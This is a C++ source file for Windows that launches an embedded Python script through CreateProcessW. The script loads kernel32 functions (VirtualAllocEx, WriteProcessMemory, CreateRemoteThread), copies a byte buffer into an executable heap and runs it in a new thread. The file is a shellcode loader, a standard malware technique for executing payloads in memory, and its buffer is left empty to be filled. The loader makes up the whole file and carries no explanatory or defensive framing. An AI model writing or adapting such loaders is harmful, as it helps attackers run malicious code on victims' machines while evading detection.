#include <iostream>
#include <cstdlib>
#include <windows.h>


using namespace std;


void interpreter(const char* command) {
    size_t size = strlen(command) + 1;
    wchar_t* payload = new wchar_t[size * 2];
    size_t  outSize;
    mbstowcs_s(&outSize, payload, size * 2, command, size - 1);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessW(NULL,
        payload,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi)
    ) {
        cout << "CreateProcess Failed (%d).\n" << GetLastError() << endl;
    }

    delete[] payload;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


int main() {
        const char* command = R"(python -c "
import ctypes
import ctypes.wintypes as wt

class buffMyBuffer():
    
    buf =  b''

    HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
    HEAP_ZERO_MEMORY = 0x00000008

    PROCESS_SOME_ACCESS = 0x000028
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    MEM_COMMIT_RESERVE = 0x3000

    PAGE_READWRITE = 0x04
    PAGE_READWRITE_EXECUTE = 0x40
    PAGE_READ_EXECUTE = 0x20

    CloseHandle = ctypes.windll.kernel32.CloseHandle
    CloseHandle.argtypes = [wt.HANDLE]
    CloseHandle.restype = wt.BOOL

    CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
    CreateRemoteThread.argtypes = [
        wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID]
    CreateRemoteThread.restype = wt.HANDLE

    CreateThread = ctypes.windll.kernel32.CreateThread
    CreateThread.argtypes = [
        wt.LPVOID, ctypes.c_size_t, wt.LPVOID,
        wt.LPVOID, wt.DWORD, wt.LPVOID
    ]

    HeapCreate = ctypes.windll.kernel32.HeapCreate
    HeapCreate.argtypes = [wt.DWORD, ctypes.c_size_t, ctypes.c_size_t]
    HeapCreate.restype = wt.HANDLE

    HeapAlloc = ctypes.windll.kernel32.HeapAlloc
    HeapAlloc.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_size_t]
    HeapAlloc.restype = wt.LPVOID

    OpenProcess = ctypes.windll.kernel32.OpenProcess
    OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
    OpenProcess.restype = wt.HANDLE

    RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
    RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
    RtlMoveMemory.restype = wt.LPVOID

    VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
    VirtualAllocEx.argtypes = [wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD]
    VirtualAllocEx.restype = wt.LPVOID

    VirtualProtectEx = ctypes.windll.kernel32.VirtualProtectEx
    VirtualProtectEx.argtypes = [
        wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.LPVOID]
    VirtualProtectEx.restype = wt.BOOL

    WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject
    WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
    WaitForSingleObject.restype = wt.DWORD

    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
    WriteProcessMemory.argtypes = [
        wt.HANDLE, wt.LPVOID, wt.LPCVOID, ctypes.c_size_t, wt.LPVOID]
    WriteProcessMemory.restype = wt.BOOL


    def buffMe(self):
        heap = self.HeapCreate(
            self.HEAP_CREATE_ENABLE_EXECUTE, len(self.buf), 0)
        self.HeapAlloc(heap, self.HEAP_ZERO_MEMORY, len(self.buf))
        print('[*] HeapAlloc() Memory at: {:08X}'.format(heap))
        self.RtlMoveMemory(heap, self.buf, len(self.buf))
        print('[*] buf copied into memory.')
        thread = self.CreateThread(0, 0, heap, 0, 0, 0)
        print('[*] CreateThread() in same process.')
        self.WaitForSingleObject(thread, 0xFFFFFFFF)


buffery = buffMyBuffer()
buffery.buffMe()

")";

    if (system("python --version >nul 2>&1") == 0) {
        interpreter(command);
    }

    return 0;

}
